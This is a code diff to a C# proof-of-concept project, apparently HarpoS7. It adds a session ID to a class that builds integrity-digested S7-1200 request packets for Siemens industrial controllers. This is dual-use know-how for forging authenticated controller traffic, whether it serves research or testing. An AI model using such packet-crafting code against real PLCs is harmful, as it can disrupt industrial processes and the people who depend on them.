@@ -1,9 +1,11 @@
+using System.Buffers.Binary;
 using HarpoS7.Integrity;
 
 namespace HarpoS7.PoC.Packets;
 
 public class GetVarSubStreamedRequest
 {
+    private readonly uint _sessionId;
     private readonly byte[] _sessionKey;
     private const int RealPlcIntegrityOffset = 0x0C;
     private const int RealPlcDataOffset = 0x2C;
@@ -22,8 +24,9 @@ public class GetVarSubStreamedRequest
         0x00, 0x72, 0x03, 0x00, 0x00
     ];
 
-    public GetVarSubStreamedRequest(ReadOnlySpan<byte> sessionKey)
+    public GetVarSubStreamedRequest(ReadOnlySpan<byte> sessionKey, uint sessionId)
     {
+        _sessionId = sessionId;
         _sessionKey = new byte[sessionKey.Length];
         sessionKey.CopyTo(_sessionKey.AsSpan());
     }
@@ -32,6 +35,10 @@ public class GetVarSubStreamedRequest
     {
         Span<byte> buffer = stackalloc byte[S71200Data.Length];
         S71200Data.CopyTo(buffer);
+
+        const int sessionIdOffset = 0x35;
+        BinaryPrimitives.WriteUInt32BigEndian(buffer[sessionIdOffset..], _sessionId);
+        BinaryPrimitives.WriteUInt32BigEndian(buffer[(sessionIdOffset + 5)..], _sessionId);
         
         HarpoPacketDigest.CalculateDigest(
             buffer[RealPlcIntegrityOffset..], 
